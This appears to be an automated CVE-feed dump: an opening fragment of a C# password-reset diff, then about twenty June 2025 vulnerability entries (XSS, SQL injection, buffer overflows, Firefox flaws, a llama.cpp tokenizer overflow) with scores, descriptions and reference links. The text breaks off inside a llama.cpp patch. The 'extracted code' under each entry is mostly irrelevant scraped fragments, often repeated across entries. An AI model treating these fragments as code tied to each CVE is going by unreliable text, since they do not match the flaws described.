     public static void SetExternalLoginProviderErrors(this HttpContext httpContext, BackOfficeExternalLoginProviderErrors errors)
         => httpContext.Items[nameof(BackOfficeExternalLoginProviderErrors)] = errors;
 
     public static BackOfficeExternalLoginProviderErrors? GetExternalLoginProviderErrors(this HttpContext httpContext)
         => httpContext.Items[nameof(BackOfficeExternalLoginProviderErrors)] as BackOfficeExternalLoginProviderErrors;
+
+    internal static void StartPasswordResetFlowSession(this HttpContext httpContext, int userId)
+        => httpContext.Session.SetInt32(PasswordResetFlowSessionKey, userId);
+
+    internal static void EndPasswordResetFlowSession(this HttpContext httpContext)
+        => httpContext.Session.Remove(PasswordResetFlowSessionKey);
+
+    internal static bool HasActivePasswordResetFlowSession(this HttpContext httpContext, int userId)
+        => httpContext.Session.GetInt32(PasswordResetFlowSessionKey) == userId;
 }


================================================================================


CVE ID: CVE-2024-56916
Published: 2025-06-24T18:15:24.240
Modified: 2025-06-30T14:43:46.500
CVSS Score: 6.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
In Netbox Community 4.1.7, once authenticated, Configuration History > Add`is vulnerable to cross-site scripting (XSS) due to the `current value` field rendering user supplied html. An authenticated attacker can leverage this to add malicious JavaScript to the any banner field. Once a victim edits a Configuration History version or attempts to Add a new version, the XSS payload will trigger.

References (3):
  1. https://github.com/netbox-community/netbox/releases/tag/v4.1.7 [Release Notes]
  2. https://github.com/noxlumens/Vulnerability-Research/tree/main/CVE-2024-56916 [Third Party Advisory, Exploit]
  3. https://www.youtube.com/watch?v=GC8-PUlu2i8 [Exploit]

Attempting to extract code examples from references...

--- Code from https://github.com/netbox-community/netbox/releases/tag/v4.1.7 ---
name

LOGIN_REQUIRED

to_grams()

================================================================================


CVE ID: CVE-2024-56918
Published: 2025-06-24T17:15:29.333
Modified: 2025-06-30T14:42:40.747
CVSS Score: 6.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
In Netbox Community 4.1.7, the login page is vulnerable to cross-site scripting (XSS), which allows a privileged, authenticated attacker to exfiltrate user input from the login form.

References (4):
  1. https://github.com/netbox-community/netbox/releases/tag/v4.1.7 [Release Notes]
  2. https://github.com/noxlumens/Vulnerability-Research/tree/main/CVE-2024-56918 [Third Party Advisory]
  3. https://youtu.be/GC8-PUlu2i8?si=cd_dSVno93pCisr-&t=103 [Exploit]
  4. https://youtu.be/zBbjNNK79pg [Permissions Required]

Attempting to extract code examples from references...

--- Code from https://github.com/netbox-community/netbox/releases/tag/v4.1.7 ---
name

LOGIN_REQUIRED

to_grams()

================================================================================


CVE ID: CVE-2025-6570
Published: 2025-06-24T16:15:30.253
Modified: 2025-07-02T18:24:35.030
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in PHPGurukul Hospital Management System 4.0. Affected by this issue is some unknown functionality of the file /doctor/search.php. The manipulation of the argument searchdata leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Union-based-sqli-on-doctor-search/exploit.md [Exploit, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.313742 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313742 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601698 [Third Party Advisory, VDB Entry]
  6. https://github.com/Ant1sec-ops/HMS4.0-Avdisories/blob/main/Union-based-sqli-on-doctor-search/exploit.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313742 ---
searchdata

================================================================================


CVE ID: CVE-2025-6569
Published: 2025-06-24T15:15:26.017
Modified: 2025-07-11T15:54:22.743
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability classified as problematic was found in code-projects School Fees Payment System 1.0. Affected by this vulnerability is an unknown functionality of the file /student.php. The manipulation of the argument sname/contact/about/emailid/transcation_remark leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/tuooo/CVE/issues/18 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313741 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313741 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601612 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313741 ---
sname/contact/about/emailid/transcation_remark

================================================================================


CVE ID: CVE-2025-6568
Published: 2025-06-24T15:15:25.823
Modified: 2025-06-27T16:43:42.703
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical has been found in TOTOLINK EX1200T 4.1.2cu.5232_B20210713. Affected is an unknown function of the file /boafrm/formIpv6Setup of the component HTTP POST Request Handler. The manipulation of the argument submit-url leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/d2pq/cve/blob/main/616/23.md [Exploit, Third Party Advisory]
  2. https://github.com/d2pq/cve/blob/main/616/23.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.313740 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313740 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601344 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313740 ---
submit-url

================================================================================


CVE ID: CVE-2025-6567
Published: 2025-06-24T15:15:25.623
Modified: 2025-06-27T16:48:39.390
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Online Recruitment Management System 1.0. It has been rated as critical. This issue affects some unknown processing of the file Recruitment/admin/view_application.php. The manipulation of the argument ID leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Sp1d3rL1/CVE/issues/3 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313739 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313739 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601339 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313739 ---
id

================================================================================


CVE ID: CVE-2025-6566
Published: 2025-06-24T13:15:25.057
Modified: 2025-06-26T18:58:14.280
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in oatpp Oat++ up to 1.3.1. It has been declared as critical. This vulnerability affects the function deserializeArray of the file src/oatpp/json/Deserializer.cpp. The manipulation leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/oatpp/oatpp/issues/1037
  2. https://github.com/user-attachments/files/19579448/oatpp_crash.txt
  3. https://vuldb.com/?ctiid.313738
  4. https://vuldb.com/?id.313738
  5. https://vuldb.com/?submit.597453
  6. https://github.com/oatpp/oatpp/issues/1037

Attempting to extract code examples from references...

--- Code from https://github.com/oatpp/oatpp/issues/1037 ---
src/oatpp/json/Deserializer.cpp:77:14

src/oatpp/json/Deserializer.cpp:77:14

================================================================================


CVE ID: CVE-2025-6565
Published: 2025-06-24T13:15:24.790
Modified: 2025-06-26T18:58:14.280
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in Netgear WNCE3001 1.0.0.50. It has been classified as critical. This affects the function http_d of the component HTTP POST Request Handler. The manipulation of the argument Host leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/xiaobor123/vul-finds/tree/main/vul-find-wnce3001-netgear
  2. https://github.com/xiaobor123/vul-finds/tree/main/vul-find-wnce3001-netgear#poc
  3. https://vuldb.com/?ctiid.313737
  4. https://vuldb.com/?id.313737
  5. https://vuldb.com/?submit.590030
  6. https://www.netgear.com/

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313737 ---
http_d

http_d

Host

================================================================================


CVE ID: CVE-2025-6436
Published: 2025-06-24T13:15:24.677
Modified: 2025-07-14T19:15:35.423
CVSS Score: 8.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer

Description:
Memory safety bugs present in Firefox 139 and Thunderbird 139. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code. This vulnerability affects Firefox < 140 and Thunderbird < 140.

References (3):
  1. https://bugzilla.mozilla.org/buglist.cgi?bug_id=1941377%2C1960948%2C1966187%2C1966505%2C1970764 [Broken Link]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-54/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6435
Published: 2025-06-24T13:15:24.560
Modified: 2025-07-14T19:15:35.277
CVSS Score: 8.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
If a user saved a response from the Network tab in Devtools using the Save As context menu option, that file may not have been saved with the `.download` file extension. This could have led to the user inadvertently running a malicious executable. This vulnerability affects Firefox < 140 and Thunderbird < 140.

References (4):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1950056 [Permissions Required]
  2. https://bugzilla.mozilla.org/show_bug.cgi?id=1961777 [Permissions Required]
  3. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  4. https://www.mozilla.org/security/advisories/mfsa2025-54/

Attempting to extract code examples from references...

--- Code from https://bugzilla.mozilla.org/show_bug.cgi?id=1950056 ---
file

nsFilePicker

FOS_NODEREFERENCELINKS

================================================================================


CVE ID: CVE-2025-6434
Published: 2025-06-24T13:15:24.447
Modified: 2025-07-14T19:15:35.130
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-1021: Improper Restriction of Rendered UI Layers or Frames

Description:
The exception page for the HTTPS-Only feature, displayed when a website is opened via HTTP, lacked an anti-clickjacking delay, potentially allowing an attacker to trick a user into granting an exception and loading a webpage over HTTP. This vulnerability affects Firefox < 140 and Thunderbird < 140.

References (3):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1955182 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-54/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6433
Published: 2025-06-24T13:15:24.327
Modified: 2025-07-14T19:15:34.983
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-295: Improper Certificate Validation

Description:
If a user visited a webpage with an invalid TLS certificate, and granted an exception, the webpage was able to provide a WebAuthn challenge that the user would be prompted to complete.  This is in violation of the WebAuthN spec which requires "a secure transport established without errors". This vulnerability affects Firefox < 140 and Thunderbird < 140.

References (3):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1954033 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-54/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6432
Published: 2025-06-24T13:15:24.220
Modified: 2025-07-14T19:15:34.817
CVSS Score: 8.6 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L

CWE Categories:
  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

Description:
When Multi-Account Containers was enabled, DNS requests could have bypassed a SOCKS proxy when the domain name was invalid or the SOCKS proxy was not responding. This vulnerability affects Firefox < 140 and Thunderbird < 140.

References (3):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1943804 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-54/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6431
Published: 2025-06-24T13:15:24.103
Modified: 2025-07-03T16:04:21.163
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N

CWE Categories:
  - CWE-285: CWE-285

Description:
When a link can be opened in an external application, Firefox for Android will, by default, prompt the user before doing so. An attacker could have bypassed this prompt, potentially exposing the user to security vulnerabilities or privacy leaks in external applications. 
*This bug only affects Firefox for Android. Other versions of Firefox are unaffected.* This vulnerability affects Firefox < 140.

References (2):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1942716 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6430
Published: 2025-06-24T13:15:23.993
Modified: 2025-07-14T19:15:34.660
CVSS Score: 6.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
When a file download is specified via the `Content-Disposition` header, that directive would be ignored if the file was included via a `&lt;embed&gt;` or `&lt;object&gt;` tag, potentially making a website vulnerable to a cross-site scripting attack. This vulnerability affects Firefox < 140, Firefox ESR < 128.12, Thunderbird < 140, and Thunderbird < 128.12.

References (5):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1971140 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-53/ [Vendor Advisory]
  4. https://www.mozilla.org/security/advisories/mfsa2025-54/
  5. https://www.mozilla.org/security/advisories/mfsa2025-55/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6429
Published: 2025-06-24T13:15:23.877
Modified: 2025-07-14T19:15:34.500
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N

CWE Categories:
  - CWE-116: CWE-116

Description:
Firefox could have incorrectly parsed a URL and rewritten it to the youtube.com domain when parsing the URL specified in an `embed` tag.  This could have bypassed website security checks that restricted which domains users were allowed to embed. This vulnerability affects Firefox < 140, Firefox ESR < 128.12, Thunderbird < 140, and Thunderbird < 128.12.

References (5):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1970658 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-53/ [Vendor Advisory]
  4. https://www.mozilla.org/security/advisories/mfsa2025-54/
  5. https://www.mozilla.org/security/advisories/mfsa2025-55/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6428
Published: 2025-06-24T13:15:23.770
Modified: 2025-07-03T16:42:54.900
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

Description:
When a URL was provided in a link querystring parameter, Firefox for Android would follow that URL instead of the correct URL, potentially leading to phishing attacks.
*This bug only affects Firefox for Android. Other versions of Firefox are unaffected.* This vulnerability affects Firefox < 140.

References (2):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1970151 [Exploit, Issue Tracking, Vendor Advisory]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://bugzilla.mozilla.org/show_bug.cgi?id=1970151 ---
https://gingernut.helevtica.systems

http://test.local

================================================================================


CVE ID: CVE-2025-6427
Published: 2025-06-24T13:15:23.650
Modified: 2025-07-14T19:15:34.340
CVSS Score: 9.1 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

CWE Categories:
  - CWE-693: CWE-693

Description:
An attacker was able to bypass the `connect-src` directive of a Content Security Policy by manipulating subdocuments. This would have also hidden the connections from the Network tab in Devtools. This vulnerability affects Firefox < 140 and Thunderbird < 140.

References (3):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1966927 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-54/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6426
Published: 2025-06-24T13:15:23.537
Modified: 2025-07-14T19:15:33.737
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-345: CWE-345

Description:
The executable file warning did not warn users before opening files with the `terminal` extension. 
*This bug only affects Firefox for macOS. Other versions of Firefox are unaffected.* This vulnerability affects Firefox < 140, Firefox ESR < 128.12, Thunderbird < 140, and Thunderbird < 128.12.

References (5):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1964385 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-53/ [Vendor Advisory]
  4. https://www.mozilla.org/security/advisories/mfsa2025-54/
  5. https://www.mozilla.org/security/advisories/mfsa2025-55/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6425
Published: 2025-06-24T13:15:23.403
Modified: 2025-07-03T16:23:06.293
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

Description:
An attacker who enumerated resources from the WebCompat extension could have obtained a persistent UUID that identified the browser, and persisted between containers and normal/private browsing mode, but not profiles. This vulnerability affects Firefox < 140, Firefox ESR < 115.25, Firefox ESR < 128.12, Thunderbird < 140, and Thunderbird < 128.12.

References (6):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1717672 [Issue Tracking, Vendor Advisory]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-52/ [Vendor Advisory]
  4. https://www.mozilla.org/security/advisories/mfsa2025-53/ [Vendor Advisory]
  5. https://www.mozilla.org/security/advisories/mfsa2025-54/ [Vendor Advisory]
  6. https://www.mozilla.org/security/advisories/mfsa2025-55/ [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://bugzilla.mozilla.org/show_bug.cgi?id=1717672 ---
web_accessible_resources

web_accessible_resources

<code>    // In general, the UUID should not change once assigned because it may be
    // stored elsewhere within the profile directory, when the extension URL is
    // exposed (e.g. history, bookmarks, site permissions, web or extension
    // APIs that associate data with the extension principal or origin).
    // The webcompat add-on does not rely on the persisted uuid, so we can
    // simply migrate the uuid below, see bug 1717672.


================================================================================


CVE ID: CVE-2025-6424
Published: 2025-06-24T13:15:23.273
Modified: 2025-07-02T21:15:41.517
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-416: Use After Free

Description:
A use-after-free in FontFaceSet resulted in a potentially exploitable crash. This vulnerability affects Firefox < 140, Firefox ESR < 115.25, Firefox ESR < 128.12, Thunderbird < 140, and Thunderbird < 128.12.

References (6):
  1. https://bugzilla.mozilla.org/show_bug.cgi?id=1966423 [Permissions Required]
  2. https://www.mozilla.org/security/advisories/mfsa2025-51/ [Vendor Advisory]
  3. https://www.mozilla.org/security/advisories/mfsa2025-52/ [Vendor Advisory]
  4. https://www.mozilla.org/security/advisories/mfsa2025-53/ [Vendor Advisory]
  5. https://www.mozilla.org/security/advisories/mfsa2025-54/
  6. https://www.mozilla.org/security/advisories/mfsa2025-55/

Attempting to extract code examples from references...

--- Code from https://www.mozilla.org/security/advisories/mfsa2025-51/ ---
terminal

connect-src

embed

================================================================================


CVE ID: CVE-2025-6206
Published: 2025-06-24T09:15:25.653
Modified: 2025-08-13T13:39:01.753
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
The Aiomatic - Automatic AI Content Writer & Editor, GPT-3 & GPT-4, ChatGPT ChatBot & AI Toolkit plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the 'aiomatic_image_editor_ajax_submit' function in all versions up to, and including, 2.5.0. This makes it possible for authenticated attackers, with Subscriber-level access and above, to upload arbitrary files on the affected site's server which may make remote code execution possible. In order to exploit the vulnerability, there must be a value entered for the Stability.AI API key. The value can be arbitrary.

References (2):
  1. https://codecanyon.net/item/aiomatic-automatic-ai-content-writer/38877369#item-description__changelog [Release Notes]
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/8e0ff2d6-65d2-4a54-b3e5-64b424013313?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://codecanyon.net/item/aiomatic-automatic-ai-content-writer/38877369#item-description__changelog ---
1. Added the ability to store AI prompts on OpenAI's part for different modules of the plugin (chatbot, forms, AI Content Editor, Bulk AI Post Creators or Globally). This stored data can be used for custom model training, model distillation or evaluations
2. Automatic comment/review writer improvements in user name generator and comment source IP address
3. Added more API options for Replicate AI models
4. Added the ability to show a real time waveform animation, each time the chatbot speaks
5. Added support for the latest omni-moderation-latest text moderation model
6. Fixed rare fatal issue at first plugin install
7. Fixed an incompatibility with the WoodMart theme


1. Added support for Azure OpenAI Assistants API
2. Added support for Ollama embedding models, check available models, here: https://ollama.com/search?c=embedding
3. Added AI Vision (image recognition) support for Ollama, you can check AI models supporting vision, here: https://ollama.com/search?c=vision
4. Added Tool Calling support for Ollama, you can check AI models supporting tool calls (function calls), here: https://ollama.com/search?c=tools
5. Added new Google AI model: gemini-1.5-flash-8b-latest
6. Added support for Google Gemini AI models Vision feature
7. Added support for Anthropic Claude AI models Vision feature
8. Added support for Groq AI models Vision feature
9. Added support for OpenRouter AI models Vision feature
10. Added support for Azure OpenAI models Vision feature
11. Added Groq new 'preview' models (including llama 3.2 family models)
12. Added support for o1 family models in Azure OpenAI API
13. Added the ability to select the Azure OpenAI API version used in API calls
14. Bulk AI Post Creator - YouTube to Posts module, allow to get videos from YouTube playlists
15. Fixed chatbot text-to-speech and text-to-video, no longer including also HTML tags, only plain text


1. Ollama embeddings now work with more models
2. Fixed Anthropic Claude streaming
3. Added new Anthropic Claude Sonnet model: claude-3-5-sonnet-20241022
4. Added the ability to hide Aiomatic's features on the single page/post editor
5. On deactivation, the plugin will prompt about purchase code deactivation (revoking)
6. On deactivation, the plugin will be able to remove also its internal data (settings)
7. More parameters can be passed to Replicate Flux API
8. Fixed the [aicontent] shortcode renderer mechanism, it will no longer render other shortcodes on the page if the [aicontent] shortcode is not found in the content
9. Fixed error in AI Forms when combined with some browsers
10. Updated translations


================================================================================


CVE ID: CVE-2025-52566
Published: 2025-06-24T04:15:46.967
Modified: 2025-08-27T14:01:31.297
CVSS Score: 8.6 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-195: CWE-195

Description:
llama.cpp is an inference of several LLM models in C/C++. Prior to version b5721, there is a signed vs. unsigned integer overflow in llama.cpp's tokenizer implementation (llama_vocab::tokenize) (src/llama-vocab.cpp:3036) resulting in unintended behavior in tokens copying size comparison. Allowing heap-overflowing llama.cpp inferencing engine with carefully manipulated text input during tokenization process. This issue has been patched in version b5721.

References (3):
  1. https://github.com/ggml-org/llama.cpp/commit/dd6e6d0b6a4bbe3ebfc931d1eb14db2f2b1d70af [Patch]
  2. https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-7rxv-5jhh-j6xx [Exploit, Vendor Advisory]
  3. https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-7rxv-5jhh-j6xx [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/ggml-org/llama.cpp/commit/dd6e6d0b6a4bbe3ebfc931d1eb14db2f2b1d70af ---
From dd6e6d0b6a4bbe3ebfc931d1eb14db2f2b1d70af Mon Sep 17 00:00:00 2001
From: Ruikai Peng <retr0@retr0.blog>
Date: Fri, 20 Jun 2025 22:13:06 +0800
Subject: [PATCH] vocab : prevent tokenizer overflow (#14301)

* vocab : prevent stack overflow in tokenize

* vocab : return error instead of aborting on oversized token count

* vocab : INT32_MIN from llama_tokenize on overflow
---
 common/common.cpp   | 3 +++
 include/llama.h     | 1 +
 src/llama-vocab.cpp | 5 +++++
 3 files changed, 9 insertions(+)

diff --git a/common/common.cpp b/common/common.cpp
index c2c94e7ae6c08..e4e71ad13fb59 100644
--- a/common/common.cpp
+++ b/common/common.cpp
@@ -1290,6 +1290,9 @@ std::vector<llama_token> common_tokenize(
     int n_tokens = text.length() + 2 * add_special;
     std::vector<llama_token> result(n_tokens);
     n_tokens = llama_tokenize(vocab, text.data(), text.length(), result.data(), result.size(), add_special, parse_special);
+    if (n_tokens == std::numeric_limits<int32_t>::min()) {
+        throw std::runtime_error("Tokenization failed: input text too large, tokenization result exceeds int32_t limit");
+    }
     if (n_tokens < 0) {
         result.resize(-n_tokens);
         int check = llama_tokenize(vocab, text.data(), text.length(), result.data(), result.size(), add_special, parse_special);
diff --git a/include/llama.h b/include/llama.h
index 3475d596502c6..b04720bee59ef 100644
--- a/include/llama.h
+++ b/include/llama.h
@@ -1088,6 +1088,7 @@ extern "C" {
     /// @param tokens The tokens pointer must be large enough to hold the resulting tokens.
     /// @return Returns the number of tokens on success, no more than n_tokens_max
     /// @return Returns a negative number on failure - the number of tokens that would have been returned
+    /// @return Returns INT32_MIN on overflow (e.g., tokenization result size exceeds int32_t limit)
     /// @param add_special Allow to add BOS and EOS tokens if model is configured to do so.
     /// @param parse_special Allow tokenizing special and/or control tokens which otherwise are not exposed and treated
     ///                      as plaintext. Does not insert a leading space.
diff --git a/src/llama-vocab.cpp b/src/llama-vocab.cpp
index 4ab120d9ba818..4aaf4c8250ce5 100644
